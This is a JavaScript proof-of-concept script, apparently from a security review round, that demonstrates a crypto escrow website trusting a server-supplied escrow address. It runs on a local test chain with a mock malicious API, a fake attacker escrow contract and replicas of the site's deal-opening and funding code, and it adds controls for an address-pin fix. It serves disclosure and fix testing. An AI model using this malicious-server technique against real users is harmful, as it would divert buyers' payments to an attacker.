// ROUND 14 — Team A: K-841 website /d/ escrow-address trust PoC (Team B spec).
// Mock Bull API + fresh Anvil 4663 + live escrow v3 zerofee etch + USDG
// etched (6-dec) + mock token T + AttackerEscrow (fake escrow, forge-built)
// + VERBATIM replica of the website's M(e) open + V(e) fund logic from
// chunk page-16d1cf063b916c2c.js (sha 4140f516…, byte-identical round 11):
//   M: POST /api/quote {token, offerId, asset} -> take a.params / a.quote /
//      a.consent and send createDeal to n.escrow.address (from GET
//      /api/buyer/<token>), NO comparison against the hardcoded HI
//      (0xd961cA37e339E14e0D3478383a252E218fe7aa4a, module 82193, used 0x in
//      the chunk); only post-check is that a DealCreated event exists.
//   V: approve(token, s, amount) + fundPayment(dealId) to
//      s = e.escrowAddress || n.escrow.address — also server-supplied.
// The mock server returns FULLY HONEST params/quote/consent (honest seller
// signs a real consent for the real escrow); ONLY the escrow address is
// fake. Throwaway local keys only. No live POSTs, no real funds, no browser.
//
// P1 (primer): escrow = Attacker. EXPECTED if alive: M sends createDeal to
//   the attacker without error (fake DealCreated passes the post-check);
//   V approves + fundPayment to the attacker; attacker nets the full 500
//   USDG; 0 deals exist on the real v3 escrow.
// C0 (jujur): escrow = real v3 -> real deal settles, buyer receives 100 T.
// C1 (cek penutup): replica M/V WITH an address pin (HI + the two legacy
//   escrows hardcoded in module 82193) -> REFUSES the attacker address
//   before sending anything, 0 funds out.
// C2 (B-24 tidak menangkap ini): replica M with ALL params-vs-offer
//   comparisons (the B-24 fix) but NO escrow pin -> the attack STILL
//   succeeds, because the params are honest; only the address is fake.
//
// CAVEAT (honest, must be in the report): the escrow address IS displayed
// on the page as a truncated link ("On-chain escrow contract: <link>") —
// display is not verification; no comparison exists in the code.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, parseUnits, erc20Abi, parseEventLogs,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const RPC = "http://127.0.0.1:8547";
const API_PORT = 3009;
const ESCROW = "0xd961cA37e339E14e0D3478383a252E218fe7aa4a";
const LEGACY_ESCROWS = ["0xd685d39E7a3deF19E52B9AB09679b7452C23e20b", "0xD15dD54191d403156F7e29B6bD7637cEcE63E627"];
const HI_SET = new Set([ESCROW.toLowerCase(), ...LEGACY_ESCROWS.map((x) => x.toLowerCase())]);
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const attackerKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const sellerKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const victim = privateKeyToAccount(victimKey);
const attacker = privateKeyToAccount(attackerKey);
const seller = privateKeyToAccount(sellerKey);
const V = victim.address, A = attacker.address, S = seller.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const walletS = createWalletClient({ chain, transport: vhttp(RPC), account: seller });
const now = async () => Number((await publicClient.getBlock()).timestamp);

const ESCROW_ABI = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p,(uint16 feeBps,uint64 expiry,bytes sig) q,(uint64 validUntil,bytes sig) c) returns (uint256)",
  "function fundPayment(uint256 id) payable",
  "function fundTokens(uint256 id)",
  "function deals(uint256 id) view returns (address buyer,address seller,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline,bool buyerFunded,bool sellerFunded,uint8 status,address sellerPayout,address buyerReceive,uint16 feeBps)",
  "event DealCreated(uint256 indexed id,address indexed buyer,address indexed seller,uint16 feeBps)",
]);
const FAKE_ABI = parseAbi([
  "function nextId() view returns (uint256)",
  "function token() view returns (address)",
  "function beneficiary() view returns (address)",
]);
const CONSENT_TYPES = { Consent: [
  { name: "buyer", type: "address" }, { name: "seller", type: "address" },
  { name: "sellerPayout", type: "address" }, { name: "buyerReceive", type: "address" },
  { name: "sellToken", type: "address" }, { name: "sellAmount", type: "uint256" },
  { name: "payToken", type: "address" }, { name: "payAmount", type: "uint256" },
  { name: "deadline", type: "uint64" }, { name: "validUntil", type: "uint64" },
] };
const CONSENT_DOMAIN = { name: "BullEscrow", version: "3", chainId: 4663, verifyingContract: ESCROW };
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const nextDealId = async () => BigInt(await publicClient.getStorageAt({ address: ESCROW, slot: "0x0" }));
const fakeNextId = async (fake) => publicClient.readContract({ address: fake, abi: FAKE_ABI, functionName: "nextId" });

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const toHex32 = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");

let TOKEN_T, FAKE;
const current = { mode: "p1" };
const OFFER = { id: "offer-1", token: null, price: "500", payAsset: "base", sellerWallet: S };
async function signConsent(signer, p) {
  return signer.signTypedData({ domain: CONSENT_DOMAIN, types: CONSENT_TYPES, primaryType: "Consent", message: p });
}
const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  // GET /api/buyer/<token>: the page state, INCLUDING n.escrow.address.
  // The malicious server points it at the attacker contract in every mode
  // except c0 (honest control).
  if (req.url.startsWith("/api/buyer/") && req.method === "GET") {
    const escrowAddr = current.mode === "c0" ? ESCROW : FAKE;
    return send({ escrow: { address: escrowAddr, token: TOKEN_T },
      pay: { token: USDG, decimals: 6 }, alt: null,
      offers: [{ ...OFFER, token: TOKEN_T }] });
  }
  if (req.url === "/api/quote" && req.method === "POST") {
    const t = await now();
    const deadline = BigInt(t + 7 * 86400), validUntil = BigInt(t + 86400);
    // FULLY HONEST params + quote + consent (honest seller signs a real
    // consent for the REAL escrow). Only the escrow ADDRESS is fake.
    const params = { seller: S, sellerPayout: S, buyerReceive: V,
      sellToken: TOKEN_T, sellAmount: parseUnits("100", 18).toString(), payToken: USDG,
      payAmount: (500n * 10n ** 6n).toString(), deadline: deadline.toString() };
    const consentSig = await signConsent(walletS, { buyer: V, seller: S, sellerPayout: S,
      buyerReceive: V, sellToken: TOKEN_T, sellAmount: parseUnits("100", 18), payToken: USDG,
      payAmount: 500n * 10n ** 6n, deadline, validUntil });
    return send({ params, quote: { feeBps: 100, expiry: (t + 3600).toString(), sig: "0x" + "00".repeat(65) },
      consent: { validUntil: validUntil.toString(), sig: consentSig } });
  }
  res.writeHead(404); res.end("{}");
});

// ---- Replica of website M(e): verbatim, escrow address from the server ----
async function websiteOpen(offer, n, { pinEscrow = false, checkParams = false } = {}) {
  const r = await fetch(`http://127.0.0.1:${API_PORT}/api/quote`, { method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ token: offer.token, offerId: offer.id, asset: "base" }) });
  const a = await r.json();
  if (!r.ok) throw new Error("Could not get the fee quote.");
  const i = a.params, s = a.quote, cc = a.consent;
  // C1: the missing check — pin the escrow address to the hardcoded set.
  if (pinEscrow && !HI_SET.has(String(n.escrow.address).toLowerCase()))
    throw new Error(`REFUSED-BY-PIN: escrow address ${n.escrow.address} is not a Bull escrow (HI set).`);
  // C2: the B-24 fix — compare every param against the offer (no pin).
  if (checkParams) {
    if (i.seller.toLowerCase() !== offer.sellerWallet.toLowerCase()) throw new Error("REFUSED-BY-CHECK: params.seller != offer seller.");
    if (i.sellToken.toLowerCase() !== offer.token.toLowerCase()) throw new Error("REFUSED-BY-CHECK: params.sellToken != offer token.");
    if (BigInt(i.sellAmount) !== parseUnits("100", 18)) throw new Error("REFUSED-BY-CHECK: params.sellAmount != offer amount.");
    if (i.payToken.toLowerCase() !== USDG.toLowerCase()) throw new Error("REFUSED-BY-CHECK: params.payToken != USDG.");
    if (BigInt(i.payAmount) !== parseUnits(offer.price, 6)) throw new Error("REFUSED-BY-CHECK: params.payAmount != offer price.");
    if (i.buyerReceive.toLowerCase() !== ZERO && i.buyerReceive.toLowerCase() !== V.toLowerCase()) throw new Error("REFUSED-BY-CHECK: params.buyerReceive is not the buyer.");
  }
  const data = encodeFunctionData({ abi: ESCROW_ABI, functionName: "createDeal",
    args: [{ seller: i.seller, sellerPayout: i.sellerPayout, buyerReceive: i.buyerReceive,
             sellToken: i.sellToken, sellAmount: BigInt(i.sellAmount), payToken: i.payToken,
             payAmount: BigInt(i.payAmount), deadline: BigInt(i.deadline) },
           { feeBps: s.feeBps, expiry: BigInt(s.expiry), sig: s.sig },
           { validUntil: BigInt(cc.validUntil), sig: cc.sig }] });
  const h = await walletV.sendTransaction({ to: n.escrow.address, data, value: 0n });
  const rc = await publicClient.waitForTransactionReceipt({ hash: h });
  const ev = parseEventLogs({ abi: ESCROW_ABI, logs: rc.logs, eventName: "DealCreated" })[0];
  if (!ev) throw new Error("Deal was not created.");
  return ev.args.id;
}

// ---- Replica of website V(e): pay the OFFER amount to the server address ----
async function websiteFund(offer, n, dealId) {
  const t = "alt" === offer.payAsset && n.alt;
  const a = t ? n.alt : n.pay;
  const amt = parseUnits(t ? offer.payAmount || "0" : offer.price, a.decimals);
  const s = offer.escrowAddress || n.escrow.address;
  if (a.token) {
    await walletV.writeContract({ address: a.token, abi: erc20Abi, functionName: "approve", args: [s, amt] });
    await walletV.writeContract({ address: s, abi: ESCROW_ABI, functionName: "fundPayment", args: [BigInt(dealId)] });
  } else {
    await walletV.writeContract({ address: s, abi: ESCROW_ABI, functionName: "fundPayment", args: [BigInt(dealId)], value: amt });
  }
}

async function sellerFunds(dealId, token, wallet) {
  await wallet.writeContract({ address: token, abi: erc20Abi, functionName: "approve", args: [ESCROW, parseUnits("100", 18)] });
  await wallet.writeContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "fundTokens", args: [BigInt(dealId)] });
}

async function fetchState() {
  const r = await fetch(`http://127.0.0.1:${API_PORT}/api/buyer/${TOKEN_T}`);
  return r.json();
}

async function main() {
  await new Promise((r) => server.listen(API_PORT, r));
  const escZero = "0x" + fs.readFileSync(path.join(ROOT, "chain/bytecode/escrow-v3-zerofee.hex"), "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [ESCROW, escZero]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x5", toHex32(1n)]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x0", toHex32(1n)]);
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockERC20.json"), "utf8"));
  const fakeArt = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/AttackerEscrow.sol/AttackerEscrow.json"), "utf8"));
  async function deployMock() {
    const h = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
    return (await publicClient.waitForTransactionReceipt({ hash: h })).contractAddress;
  }
  TOKEN_T = await deployMock();
  const usdgDeployed = await deployMock();
  const usdgCode = await publicClient.getCode({ address: usdgDeployed });
  await rpc("anvil_setCode", [USDG, usdgCode]);
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]);
  const fakeDeploy = await walletV.deployContract({ abi: fakeArt.abi, bytecode: fakeArt.bytecode.object, args: [USDG, A] });
  FAKE = (await publicClient.waitForTransactionReceipt({ hash: fakeDeploy })).contractAddress;
  OFFER.token = TOKEN_T;
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [V, 100000n * 10n ** 6n] });
  await walletV.writeContract({ address: TOKEN_T, abi: mocks.abi, functionName: "mint", args: [S, parseUnits("1000000", 18)] });

  const results = [];
  const usdg = (x) => (BigInt(x) / 10n ** 6n).toString();

  // ---- P1 (primer): escrow = attacker contract ----
  try {
    current.mode = "p1";
    const n = await fetchState();
    const atkBefore = await bal(USDG, A);
    const realDealsBefore = await nextDealId();
    const dealId = await websiteOpen(OFFER, n);
    await websiteFund(OFFER, n, dealId);
    const atkAfter = await bal(USDG, A);
    const realDealsAfter = await nextDealId();
    const buyerT = await bal(TOKEN_T, V);
    const exploited = (atkAfter - atkBefore) === 500n * 10n ** 6n && realDealsAfter === realDealsBefore && buyerT === 0n;
    results.push({ case: "K-841 P1 website /d/ trusts server escrow address (fake escrow)", exploited,
      fakeDealId: String(dealId), fakeEscrow: FAKE, attackerUsdgGained: usdg(atkAfter - atkBefore),
      realEscrowDealsCreated: Number(realDealsAfter - realDealsBefore), buyerRealTokenT: buyerT.toString(),
      detail: "M(e) sent createDeal to the attacker contract with NO error (fake DealCreated passed the post-check); V(e) approved + fundPayment to the attacker; attacker nets the full 500 USDG; 0 deals exist on the real v3 escrow." });
    console.log("[K-841 P1] exploited:", exploited, "fakeDealId:", dealId, "attacker gained:", usdg(atkAfter - atkBefore));
  } catch (e) {
    results.push({ case: "K-841 P1 website /d/ trusts server escrow address (fake escrow)", exploited: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 300) });
    console.log("[K-841 P1] threw:", String(e.message || e).slice(0, 200));
  }

  // ---- C0: honest control, escrow = real v3 ----
  try {
    current.mode = "c0";
    const n = await fetchState();
    const atkBefore = await bal(USDG, A);
    const dealId = await websiteOpen(OFFER, n);
    await websiteFund(OFFER, n, dealId);
    await sellerFunds(dealId, TOKEN_T, walletS);
    const d = await publicClient.readContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "deals", args: [BigInt(dealId)] });
    const buyerT = await bal(TOKEN_T, V);
    const atkAfter = await bal(USDG, A);
    const ok = d[9] === 2 && buyerT === parseUnits("100", 18) && atkAfter === atkBefore;
    results.push({ case: "K-841 C0 control: honest escrow -> real deal settles, buyer receives 100 T", ok,
      dealId: String(dealId), dealStatus: d[9], buyerRealTokenT: (buyerT / 10n ** 18n).toString(), attackerUsdgGained: usdg(atkAfter - atkBefore) });
    console.log("[K-841 C0] ok:", ok, "deal:", dealId, "status:", d[9]);
  } catch (e) {
    results.push({ case: "K-841 C0 control: honest escrow -> real deal settles, buyer receives 100 T", ok: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-841 C0] threw:", String(e.message || e).slice(0, 200));
  }

  // ---- C1: replica WITH the escrow-address pin must REFUSE before sending ----
  try {
    current.mode = "c1";
    const n = await fetchState();
    const atkBefore = await bal(USDG, A);
    const vicBefore = await bal(USDG, V);
    const fakeBefore = await fakeNextId(FAKE);
    const realBefore = await nextDealId();
    let threw = null;
    try { await websiteOpen(OFFER, n, { pinEscrow: true }); } catch (e) { threw = String(e.message || e); }
    const refused = threw !== null && /REFUSED-BY-PIN/.test(threw);
    const atkAfter = await bal(USDG, A);
    const vicAfter = await bal(USDG, V);
    const fakeAfter = await fakeNextId(FAKE);
    const realAfter = await nextDealId();
    const ok = refused && atkAfter === atkBefore && vicAfter === vicBefore && fakeAfter === fakeBefore && realAfter === realBefore;
    results.push({ case: "K-841 C1 control: replica WITH escrow pin (HI + legacy) refuses attacker address", ok,
      detail: threw ? threw.slice(0, 200) : "M did NOT throw — the pin failed",
      attackerUsdgDelta: usdg(atkAfter - atkBefore), victimUsdgDelta: usdg(vicAfter - vicBefore),
      fakeNextIdDelta: Number(fakeAfter - fakeBefore), realNextDealIdDelta: Number(realAfter - realBefore) });
    console.log("[K-841 C1] ok:", ok, "refused:", refused);
  } catch (e) {
    results.push({ case: "K-841 C1 control: replica WITH escrow pin (HI + legacy) refuses attacker address", ok: false,
      detail: "runner error: " + String(e.message || e).slice(0, 200) });
    console.log("[K-841 C1] runner error:", String(e.message || e).slice(0, 200));
  }

  // ---- C2: B-24 fix only (all params-vs-offer checks, NO pin) still passes ----
  try {
    current.mode = "c2";
    const n = await fetchState();
    const atkBefore = await bal(USDG, A);
    const buyerTBefore = await bal(TOKEN_T, V); // C0 already paid the buyer 100 T; measure the DELTA
    const dealId = await websiteOpen(OFFER, n, { checkParams: true });
    await websiteFund(OFFER, n, dealId);
    const atkAfter = await bal(USDG, A);
    const buyerT = await bal(TOKEN_T, V);
    const exploited = (atkAfter - atkBefore) === 500n * 10n ** 6n && (buyerT - buyerTBefore) === 0n;
    results.push({ case: "K-841 C2 control: B-24 fix (params-vs-offer checks, no pin) does NOT catch it", exploited,
      fakeDealId: String(dealId), attackerUsdgGained: usdg(atkAfter - atkBefore), buyerRealTokenTGainedInC2: ((buyerT - buyerTBefore) / 10n ** 18n).toString(),
      note: "Every param is honest (seller, sellToken, amounts, buyerReceive all match the offer) — only the escrow ADDRESS is fake, and no params check can see that." });
    console.log("[K-841 C2] exploited (B-24 fix bypassed):", exploited, "fakeDealId:", dealId);
  } catch (e) {
    results.push({ case: "K-841 C2 control: B-24 fix (params-vs-offer checks, no pin) does NOT catch it", exploited: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-841 C2] threw:", String(e.message || e).slice(0, 200));
  }

  console.log(JSON.stringify(results, null, 2));
  const exploited = results.filter((r) => r.exploited).length;
  const controlsOk = results.filter((r) => r.ok).length;
  console.log(`EXPLOITED: ${exploited}/2 (P1, C2) | CONTROLS OK: ${controlsOk}/2 (C0, C1)`);
  server.close();
  process.exit(exploited === 2 && controlsOk === 2 ? 0 : 1);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
